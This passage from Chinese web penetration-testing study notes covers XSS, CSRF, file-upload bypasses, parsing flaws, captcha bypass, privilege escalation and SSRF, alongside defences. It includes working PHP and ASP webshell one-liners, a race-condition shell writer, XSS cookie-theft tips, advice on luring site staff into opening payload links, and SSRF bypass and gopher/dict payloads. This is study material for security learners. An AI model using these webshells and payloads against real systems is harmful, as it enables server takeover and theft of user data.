dual\t\t\t#真实渗透测试过程中基本不可能知道null的数据类型\n\n4、防范sql注入注入攻击产生的关键在于系统对用户输入处理不当，未做到数据与代码分离，从而导致输入的数据被当做代码执行。\n在系统开发时，只要遵循数据与代码分离的原则，并且完全做到这点，注入漏洞是完全可以避免的。\n1.使用预编译语句集采用预编译语句集，它内置了处理sql注入的能力，只要使用它的setXXX方法传参即可。\n原理：\n\nsql注入只对sql语句的准备（编译）过程有破坏作用\n而PreparedStatement已经准备好了，执行阶段只是把输入串作为数据处理\n而不再对sql语句进行解析，准备，因此也就避免了sql注入\n\n2.使用正则表达式过滤传入的参数3.字符串过滤4.严格区分用户权限在权限设计中，针对软件用户，没有必要给予数据库的创建、删除等管理权限。这样即便在用户输入的sql语句中含有内嵌式的恶意程序，因为其权限的限定，也不可能执行。所以程序在权限设计时，最好把管理员与用户区别起来。这样能够最大限度的降低注入式攻击对数据库产生的损害。\n三、XSS注入——跨站脚本攻击XSS也是注入的一种，属于前端注入\nXSS注入的本质用户输入的数据会被当做前端js代码执行\n作用：\n\nXSS最大的作用就是窃取Cookie；\n获取内网ip\n获取浏览器保存的明文面膜\n截取网页屏幕\n网页上的键盘记录\n\n同源策略：\n同协议；同域名/ip；同端口\nXSS能窃取到的Cookie只能读取当前触发页面同源下的Cookie\n一个ip可能有不同的域名，所以域名与对应的ip不一定是同源的，只有域名对域名，同时ip对ip才是准确同源的。\n触发XSS的方法：\n标签触发：\n\n&lt;script&gt;alert(1)&lt;&#x2F;script&gt;\n弹窗是用来证明是否存在XSS，但是弹窗危害有点大，尽量避免使用。\n例如：\n&lt;script&gt;&lt;&#x2F;script&gt;在留言板等中并没有显示出来；\n或&lt;hr&#x2F;&gt;\t\t&lt;h1&gt;111&lt;&#x2F;h1&gt;\t是否呗当做html代码执行\n但是在真正的项目上面，还是要用弹窗来证明是否存在XSS，或直接打攻击代码窃取cookie\n\n\n伪协议触发（小众协议）：\n\nJavaScript:alert（123）\t\t#javascript就是伪协议，后面的东西就会被当做js代码执行\n需要点击触发，例：\n&lt;a href &#x3D; &quot;javascript:alert(123)&quot;&gt;abc&lt;&#x2F;a&gt;#点击abc才会触发xss\n\n\n事件触发：\n\n满足某种条件自动触发，例：\n&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;alert(1) &#x2F;&#x2F;&gt;\t\t#当此图片没有成功加载的时候会触发弹窗\n\n窃取Cookie：\n需要用到XSS平台，例如：xs.sb\nXSS分类反射型XSS：非持久型生效的攻击，仅仅作用一次（目标必须主动输出恶意语句）；\n反射型XSS需要进行诱骗，因为别人不会主动传出相同的传参。\n存储型XSS：你提交的数据成功实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发；\n注意单双引号的闭合，在浏览器中右键检查时，单引号有时会被浏览器渲染成双引号\n存储型xss会出现的地方：\n任何可能插入数据库的地方；但是数据不一定都存储在数据库中 ，如：日志，文件；\n用户注册的时候，商城购买的时候。\n注意：用户的输入一般控制的很严格；但是系统的获取一般控制的不严格。\n一般来说弹窗很明显，管理员很容易发现，就可以通过传参大量垃圾数据把它覆盖掉。\n\nDOM型XSS：\n\n通过js对网页进行修改的就是DOM型XSS\njs存在的意义就是让更多的工作在访问者自己的电脑中去处理，从而降低对服务器资源的占用。\nDOMXSS的优势：\n避开waf：\n因为有些情况DOMXSS的payload可以通过location.hash，即设置为锚部分从#之后的部分，既能让js读取到该参数，又不让该参数传入到服务器，从而避免waf检测。location.search也类似，它可以把部分参数放在？之后的部分。\n长度不限：\n这个很重要。\n隐蔽性强：\n攻击代码可以具有隐蔽性，持久性。例如使用Cookie和localStorage作为攻击点的DOMXSS，非常难以察觉，且持续的时间长。\n\nDOMXSS在动态和伪静态页面漏洞相较于静态页面会更多；\n伪静态页面判断：\n在控制台输入;\ndocument.lastModified\t\t#返回的时间会发生改变的就是伪静态页面\n\nDOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态的访问和更新文档内容，结构和样式，处理后的结果能够成为现实页面的一部分。\nDOM的三大对象：\nlocation\ndocument\nwindows\n例：location.hash\t\t#返回锚点之后的值，锚点（#）\n\nDOM型XSS常见的三种状态\ndoucument.write：\ndocument.write在页面上写内容；\ndocument.write支持native编码值。\ninnerHTML：\ninnnerHTML属性设置或返回表格行的开始和结束标签之间的HTML。\neval：\neval把字符串当代吗执行。\n\n在url栏中打XSS可以将js代码进行Unicode编码来进行一些绕过\n注意：编码之后的js不需要进行闭合\n通过XSS去攻击非法网站的时候，通过投诉、找客服说这个站点访问出了一些问题等，将url发给他们让他们访问，网址太长的话可以通过短链接平台来缩短网址\n绕过WAF的方法\n防范XSS：1、对Cookie进行防护：\nhttp-only——&gt;防治XSS获取Cookie的东西，禁止Js去读取存储在http-only的cookie。\n2、输入过滤：\n将用户输入的内容进行过滤。对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、POST数据等，仅接收指定长度范围内、采用所预期的字符的内容提交，对其他的一律过滤。（客户端和服务器都要）。\n3、输出转义：\n例如：往HTML标签之内插入不可信数据的时候，首先要做的就是对不可信数据进行HTMLEntity编码HTML字符实体。\n\n四、CSRF——跨站请求伪造与XSS注入区别：\nCSRF：借用你的Cookie\nXSS：盗取你的Cookie\n\ncsrf漏洞的成因：\n说白了就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个站点，都会默认你已经是登录的状态。而在这个时候，攻击者发送了狗仔好的csrf脚本或包含csrf脚本的链接，受害者访问了，就可能会执行一些用户不想做的操作（比如是添加账号等）。\n\nbp可以通过抓取的包直接生成csrf的poc\nCSRF危害：发送邮件\n修改账户信息\n资金转账\n盗取用户隐私数据\n网站被上传网马\n作为其他攻击方式的辅助攻击（比如xss）\n传播CSRF蠕虫\n\nCSRF分类：GET型：这种类型的csrf一般是由于程序员安全意识不强造成的。get类型的csrf利用只需要一个http请求：\n&lt;img src&#x3D;http:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11 &#x2F;&gt;\n\n在访问含有这个img的页面后，浏览器会自动向\nhttp:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11\n\n发送一次http请求。example.cn就会收到包含受害者登录信息的一次跨域请求，所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。\nPOST型：这种类型的csrf危害没有get型的打，利用起来通常使用的是一个自动提交的表单，如：\n&lt;form action&#x3D;http:&#x2F;&#x2F;example.cn&#x2F;csrf.php method&#x3D;POST&gt;\n&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;\n\n访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。\nPOST类型的攻击通常比GET要求更严格一些，但并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端结构不能将安全寄托在仅允许POST上。\n链接类型：连接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：\n&lt;a href&#x3D;&quot; http:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11&quot; taget&#x3D;&quot;_hacker&quot;&gt;\n      百万福利，点击就送！！\n&lt;a&#x2F;&gt;\n\n结合点击劫持，链接类型会有意外的效果。\n点击劫持\n点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱骗用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。\n通过调整iframe页面的位置，可以诱使用户恰好电机在iframe页面的一些功能性按钮上，比如提交表单。点击劫持需要对页面布局，调整按钮的位置，引导用户点击。隐藏iframe很简单，设置opacity为0，或者将iframe设置成绝对定位，把z-index设置很多，让它处在最上层。\n防范csrf的方法：1、cookie设置samesite：\n可以对cookie设置samesite属性。该属性设置cookie不随着跨域请求发送，该属性可以很大程度减少csrf攻击，但是这个属性并不是所有浏览器都兼容。\n2、验证referer:\n我们可以通过验证referer来判断请求是否为第三方网站发起的。\n3、token:\n服务端生成一个token，然后放在页面中，页面提交请求请求的时候，带上这个token。服务端把token从session中拿出，与请求中的token进行对比验证。\n4、验证码:\n由于csrf不会经过受攻击的站点，所以我们可以在网站加入验证码，这样必须通过验证码之后才能进行请求。但是我们不能每个步骤都加上验证码，那样用户体验会很差。\n5、双重cookie:\n利用csrf攻击不能获取到用户cookie的特点，我们可以要求ajax和表单请求携带一个cookie中的值。流程如下：\n用户访问网站时，向请求域名注入一个cookie，内容为一串随机字符串；\n在前端向后端发送请求时，取出cookie，并添加到url的参数中；\n后端结构验证cookie中的字段与url参数中的字段是否一致，不一致则拒绝。\n6、使用最新版的谷歌浏览器\n因为2020年，谷歌浏览器推出强制执行CORS。\n五、文件上传漏洞需要了解的：\nwebshell：网站权限\n\ngetshell：获取网站权限\n\n反弹shell：受害机器去访问攻击机\n\n正常shell：攻击机连接木马\n\nphp一句话木马：&lt;?php eval($_REQUEST[8]) ?&gt; \t\t#每个编程语言的一句话木马各不相同\n\nphp中反引号&#96;可以执行系统命令，例：\necho &#96;whoami&#96;\t\t#可以查询当前用户权限\n\n前端检测（即客户端检测）等于没有检测，因为可以禁用js\n前端校验：一般是在网页上写一段js脚本，用js去检测，校验上传文件的后缀名，有黑名单也有白名单\n\n文件上传时判断是否为前端校验的方法：\n上传文件之前开启抓包工具，上传一个不允许上传的文件，如果弹出不准上传，但是没有抓到数据包，那么就是前端校验。\n\n前端校验非常不可靠，传正常文件然后改数据就可以绕过，甚至关闭js都可以尝试绕过\n\n后端检测（即服务端检测）\n服务端检测几个常见的手段：\n- 检查Content-Type（内容类型）\t\t#这种检测只要改了后缀就可以绕过\n- 检查后缀（检查后缀是主流）\n- 检查文件头\n\n绕过Content-Type和文件头检测，只要通过图片马就可进行绕过\n\n图片马的制作：\n\t写一个一句话木马放在1.txt文件，然后找一个文件大小比较小的图片（越小越好）a.jpg，然后打开cmd，运行下面这条命令\n\tcopy a.jpg&#x2F;b + 1.txt 123.jpg\t\t#（将a.jpg和1.txt合并为123.jpg）\n\n&#x2F;b的意思是以二进制方法进行读取，然后去复合，是为了防止图片破碎\n&#x2F;b也可以用来藏东西：\n\t将1.txt压缩为zip压缩包，然后与a.jpg合成1.jpg；这样将1.jpg打开是一张图片，然后后缀名改为zip再打开的话就是1.txt\n\n文件上传绕过1、使用前端验证的\n通过bp抓包，将上传的图片文件后缀jpg改为php就可以。\n2、通过后端Content-type验证\n上传图片马，因为web容器是根据后缀来是被格式的，通过bp抓包改后缀为php即可。\n文件上传黑名单绕过1、黑名单，不允许上传.asp/.aspx/.php/.jsp\n默认情况下.php3/.php4/.php5/.phtml都会被解析为php；\n同样的还有.jsp/.jspx/.jspf都会被解析为jsp；\n.asp/.asa/.cer/.aspx会被解析为asp；\nexe/.exee会被解析为exe。\n2、.htaccess文件绕过\n.htaccess全程是Hypertext Access（超文本入口）.htaccess文件也被称为分布式配置文件，是Apache服务器中的一个配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。\n.htaccess功能：\n文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表。\n但是！这个功能默认是不开启的\n启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。\n\n使用：\n写一个文件1.txt，内容为：\nAddType application&#x2F;x-httpd-php .jpg\t\t\t#这个指定代表着.jpg文件会被当做php来解析\n\n然后重命名1.txt文件为.htaccess，如果无法将文件重命名为.htaccess，就使用命令行：\nren 1.txt .htaccess\t\n\n使用方法是上传图片马之后再上传.htaccess即可。\n3、大小写绕过\n通过大小写PhP来进行绕过，但只适用于非常老版本的web容器，现在的web容器都不区分大小写。\n4、文件后缀(空)绕过：\n在文件名后留一个空格，然后上传上去之后空格会被自动地省略，则黑名单中没有过滤的话，php和php ，就是一样的。\n5、文件后缀(点)绕过\nwindows有一个特性，会自动去掉后缀名最后的点“.”\n6、：：DATA（Windows文件流绕过）\n这里利用到了NTFS交换数据流（ADS），ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解就是，其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。\n这个方法也可以用来藏东西\necho abcd&gt;&gt;a.txt:b.txt\t\t\t#将abcd写入a.txt:b.txt，然后会生成一个a.txt，但是abcd并不会出现在a.txt中，并且a.txt的文件大小是0字节\n然后再试试1.txt::DATA\t\t\t#::$DATA就是默认不修改文件流的情况，NTFS格式文件后面都有$DATA，但是一般不显示\n通过notepad a.txt:b.txt才可以看到刚刚写入的abcd，然后可以这样编辑文件\n通过dir &#x2F;R\t\t\t#就可以看到a.txt:b.txt和1.txt::DATA\n\n使用方法：\n使用bp抓包修改文件后缀为1.php::$DATA，然后上传即可。\n7、点空点绕过\nphp. .\n\n8、通过pphphp绕过\n通过黑名单将黑名单里面出现的都变为空的话，缺乏二次校验的\npphphp\t\t\t#首先将第一个遇到的php变为了空，那么pphphp就变成了php\n\n文件上传白名单绕过1、%00截断\n00截断只有在PHP5.3.29版本以下才可以使用\n上传：\n1.php%00.jpg\t\t#有些活驴都是直接匹配字符串，强行匹配到结尾是.jpg后就允许上传，但是php的函数去执行的时候读取到0x00认为结束了，文件就变成了1.php\n\n原理：\n了解%00实际上我们要先了解0x00,0x00实际上是一个16进制表示方式，实际上就是表示ascii码值为0，有写函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了\n%00实际上和00截断十一摸一样的原理，只不过%00是经过URL编码的，%00解码后就是0x00截断的那个字符。\n0x代表16进制，同时%也代表16进制\n2、通过修改hex\n上传一个1.phpa\na的ASCII码为61，使用bp抓包，在hex模式下，找到上传的这个a然后修改a所对应的61为00，就可以了。\n有的时候文件上传上去了，但是无法进行解析，就需要配合其它漏洞才能拿下服务器，比如文件包含漏洞\n3、gif图片绕过\n有时浏览器的二次渲染会使图片马中的一句话木马变成其他的东西，从而使图片马失效\n使用gif图片的话，经过二次渲染，gif图片的文件内容有一部分是不会被改变的，我们可以通过上传图片，然后下载下来进行对比发现，一般在有hex模式编译器的第3-4行左右，我们就可以在没有发生改变的这部分写入一句话木马。\n如果木马用不了，很有可能需要配合其它漏洞，例如文件包含解析漏洞\n&#x2F;upload&#x2F;1.gif&#x2F;.php?a&#x3D;phpinfo();\n\n4、条件竞争\n核心就是：\n文件上传是①先检测还是先上传\n​            还是②先上传，再检测发现不符合，删除\n两种情况都存在，如果是第一种情况就凉凉\n但如果是第二种情况，无论是什么服务器，运算都需要时间，如果我们足够快，就能做到在文件上传之后还在检测阶段的时候就访问到上传的文件。\nphp函数有写文件的函数，当访问到的时候写文件函数运行了，即使上传的文件被删除了，写文件函数也已经写入了一个木马文件，我们就可以这个使用这个木马文件。\nfile_put_contents()：把一个字符串写入文件中。\n&lt;?php file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_REQUEST[8]) ?&gt;&#39;); ?&gt;\n\n上传：\n例如，上传一个图片马，然后查看图片，通过bp抓包改url栏为:\n&#x2F;upload&#x2F;1.php?a&#x3D;&lt;?php file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_REQUEST[8]) ?&gt;&#39;); ?&gt;\n\n然后使用爆破，随便跑一个地方，payload type改为null payloads，次数10000次，options中number of threads为15\n访问：\n访问的包\n&#x2F;upload&#x2F;2.php?8&#x3D;phpinfo()\n\n然后两遍同时开始跑包，当生成新木马，然后访问到就行。\n文件上传解析漏洞如果某个站点，上传了php没有用或无法上传的时候，可以尝试下其他脚本语言；IIS一般来说都是默认支持asp的。\nweb容器是可以创建任意后缀的\n对于网站来说，文件是怎么处理的都是由后缀决定的。解析漏洞算是黑名单的绕过。\nIIS6.0畸形解析漏洞winserver 2003默认自带IIS6.0\nwinserver 2008自带7.0\nwin 2016自带10.0\nasp的一句话木马：\n&lt;%eval request(&quot;a&quot;)%&gt;\n\n①配置错误asa/cer/cdx会被当做asp解析\n上传一个asp图片马，用bp改后缀名为asa，访问文件地址，用?a=a()看是和否报错来判断木马是否有效，当然用菜刀更直接。\n②分号截断x.asp;.jpg\n\nIIS会认为这是一个asp文件，解析分号相当于结束，这里的分号类似于00截断\nIIS5.1和7.5都没有这个漏洞\n③文件夹名影响在IIS6.0中，文件夹名如果是x.asp的话，那么这个文件夹下面的任意文件都会作为asp来执行。\nFCK编辑器或者是后台有很多功能——&gt;可以移动文件，创建目录。\nIIS7.5及以上的，若没有关闭报错的话，会爆出它的绝对路径。\nCGI解析漏洞使用范围：\n只有php语言可以使用，中间件任意，IIS7.5/7.0或者Nginx都行\n利用：\n上传php图片马之后，访问图片地址，然后url后面加上/.php，图片就会被解析成php，进而就可以进行传参。\n判断：\n找到这个网站中的某张图片，然后/.php，如果乱码了，则存在CGI解析漏洞，找到上传点就可以getshell。\n其实getshell的方法有很多，不止上传文件，例如：\n1、备份数据库，修改数据库名\n在一些比较老的CMS里，备份数据库文件的名字可以自定义，数据库里写一个小马的数据，然后备份文件名字改为xxx.asp就可以解析。\n2、后台功能强大，可以新建文件\n有些编辑器，他们可以改变上传文件的配置。\n若拥有执行SQL语句的能力，可用select 1 into dumpfile ‘c:/1.txt’来写东西到文件内。\n六、验证码绕过、密码找回漏洞验证码的作用\n第一种可以防止：恶意破解密码、刷票、论坛灌水。\n\n第二种验证码就是验证你身份的验证码。例如：邮箱验证码、短信验证码，而且短信验证码是要钱的，网站需要付钱。\n\n\n验证码绕过漏洞属于逻辑漏洞，它的问题不存在于代码，而是开发者的逻辑错误\n绕过验证码方法：\n1.利用逻辑漏洞绕过法\n2.利用图片识别\n撞库：注册了A网站，也注册了B网站，当两个网站的密码相同时就叫撞库。\n验证码绕过常见姿势\n前端验证验证码，并没有后端验证。直接抓包然后进行爆破；\n验证码设置了但是并没有校验，随便输入验证码也能够成功登录；\n验证码可以重复利用，比如现在的密码是1111，然后虽然登录失败后验证码会变，但是你输入的1111却能判定验证码正确；\n验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123。yzm验证码参数，但是我们如果去掉yzm的传参就可以绕过验证码机制，直接传参user=admin&amp;password=a                              dmin，验证码就失效了；\n验证码干扰过低，可以轻松使用脚本识别；\n验证码会在HTML页面输出；\n验证码有规则，比如是时间戳的后6位（rand函数进行随机数）；\n有万能验证码，验证码无论是什么，只要输入000000就能直接绕过；\n验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数；\n图片验证码，类型太少，容易识别\n\n滑动验证码，session参数重复校验\n\n漏洞说明：\n\n这种类型的漏洞出现几率比较低，属于滑动验证码设计缺陷。\n\n从漏洞定义角度来讲，属于“验证码爆破”，同样是通过遍历数值，当达到正确的数值后就可以通过验证。\n\n攻击手法：\n\n需要抓取多个数据包，包括开头和结尾的数据包，从而来确定数据包范围，以及数据包数值。\n\n通常为长度数值为0-200的整数。具体以实际数据包为准。\n\n修复方式：\n\n不管验证码是不是输入正确，都应该及时销毁验证码。\n\n验证码绕过只有登录成功的时候它才是一个漏洞\n密码找回漏洞\n验证码发送后前端返回\n验证码无次数限制可爆破\n验证码可控\n直接修改密码页面\n越权漏洞_&gt;自己验证码通过改包然后修改别人的密码\n\n七、越权越权访问：\n这类漏洞是指引用在检查授权时存在纰漏，使得攻击者在获得低权限用户账号后，可以利用一些方法绕过权限检查，访问或者操作到原本无权访问的高权限功能。与未授权访问有区别。\n未授权访问就是直接通过网址就可以直接访问的一些本不能给用户访问的网页；有时通过目录爆破可以得到这样的页面。\n越权分为：\n水平越权/横向越权：相同权限下不同的用户可以互相访问\n垂直越权/纵向越权：使用权限低的用户可以访问到权限较高的用户\n交叉越权：用户既可以访问相同权限的，也可以访问高权限的。\n越权漏洞也是逻辑漏洞，用漏扫工具是扫不出来的。\n测试过程：\n使用bp抓包将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权，如果可以影响到高权限用户就是垂直越权\n传参ID参数需要自己检测（常见：uid= id= user= 等）通常使用burp进行爆破传参（传参可能在get、post、cookie）。\n八、SSRF——服务器端请求伪造SSRF：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正因为它是由服务端发起的，所以它能够请求到与它相连而域外网隔离的内部系统）。就是控制目标站点去访问其他网站 。\n形成的原因：\n大都是由于服务端提供了从其它服务器应用获取数据的功能且没有对目标站点做过滤与限制。比如从指定 URL地址获取网页文本信息，加载指定的图片，下载等等。\n注意：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip的端口是否开放服务，只不过该危害比较小而已。\n可能出现的地方\n社交分享功能：获取超链接的标题等内容进行显示；\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览；\n在线翻译：给网址翻译对应网页的内容；\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片；\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验；\n云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以结果可以捕获相应的信息，就可以进行ssrf测试；\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作；\n数据库内置功能：数据库的比如mongodb的copyDatabase函数；\n邮件系统：比如接收邮件服务器地址；\n编码处理，属性信息处理，文件处理：\n未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞；一些url中的关键字：share、wap、url、link、src、source、target、u、1g、display、sourceURL、imageURL、doamin…\n从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n危害：第一种危害：我们可以通过http访问到一些未开发完的网站；\n第二种危害：SSRF不只有支持HTTP协议，通过file协议可以获取到php的源码，能够读取是很有用的，因为一些配置文件很有可能得到数据库的账号密码，不只有file协议；dict协议（字典协议）：查询开放的端口，例：dict://127.0.0.1:14147\n利用方式（SSRF能做什么）：\n让服务端去访问对应的网址；\n让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms；\n可以使用file、dict、gopher、ftp协议进行请求访问相应的文件；\n攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包（palyload））；\n攻击内网应用程序（利用跨协议通信技术）；\n判断内网主机是否存活：方法是访问看是否有端口开放；\nDOS攻击（请求大文件，之中保持连接keep_aline always）\n\n漏洞实例：\nWordpress3.5.1以下版本xmlrpc.php pingback的缺陷与ssrf；\ndiscuz!的ssrf（利用php的header函数来绕过，其实就是302跳转实现协议转换）；\nweblogic的ssrf。\n\n防护SSRF：\n禁止跳转；\n过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；\n禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://，gopher://，ftp://等引起的问题；\n设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）；\n限制请求的端口为http常用的端口，比如80、443、8080、8090；\n同一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n通过正则匹配，不允许你传内网地址。\n\nSSRF绕过：1、攻击本地\nhttp:&#x2F;&#x2F;127.0.0.1:80\nhttp:&#x2F;&#x2F;localhost:22\n\n2、利用[::]\n利用[::]绕过localhost\nhttp:&#x2F;&#x2F;[::]:80\t\t\t#等价于http:&#x2F;&#x2F;127.0.0.1:80\n\n3、利用@\nhttp:&#x2F;&#x2F;example.com@127.0.0.1\n\n4、利用短地址\nhttp:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1\n\n5、利用特殊域名\n利用的原理是DNS解析\nhttp:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;\nhttp:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;\n\n6、利用DNS解析\n在域名上设置A记录，指向127.0.0.1\n\n7、利用Enclosed alphanumerics\n利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\n8、利用句号\n127。0。0。1  &gt;&gt;&gt;  127.0.0.1\n\n9、利用进制转换\n可以是十六进制，八进制等。\n115.239.210.26  &gt;&gt;&gt;  16373751032\n首先把这四段数字给分别转成16进制，结果：73 ef d2 1a\n然后把 73efd21a 这十六进制一起转换成8进制\n记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x\n\nhttp:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;\nhttp:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;\nhttp:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;\nhttp:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;\n\n10、利用特殊地址\nhttp:&#x2F;&#x2F;0&#x2F;\n\n11、利用协议\nDict:&#x2F;&#x2F;\ndict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;\nssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;\nSFTP:&#x2F;&#x2F;\nssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;\nTFTP:&#x2F;&#x2F;\nssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET\nLDAP:&#x2F;&#x2F;\nssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit\nGopher:&#x2F;&#x2F;\nssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\n\n12、使用组合\n各种绕过进行自由组合\n\n九、支付漏洞快捷支付原理：客户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知。\n\n浏览器跳转：（基本遇不到）\n\n基于用户访问的浏览器，如果用户在银行页面之父陈恭候，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。并且浏览器端数据很容易被篡改而降低安全性。\n\n\n服务器端异步通知\n\n该方法是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等。\n\n\n\n支付漏洞属于逻辑漏洞，不需要代码审计。\n常见支付漏洞：\n修改支付的价格；\n修改支付状态；\n修改订单数量；\n修改附属值：例如：优惠券；\n越权支付：支付扣钱为什么不能别人的；\n无限制试用。\n\n如何挖掘支付漏洞：\n找到关键的数据包：\n\n可能一个支付操作有三四个数据包，我们要对数据包进行挑选。\n\n\n分析数据包：\n\n支付数据包中会包含很多的敏感信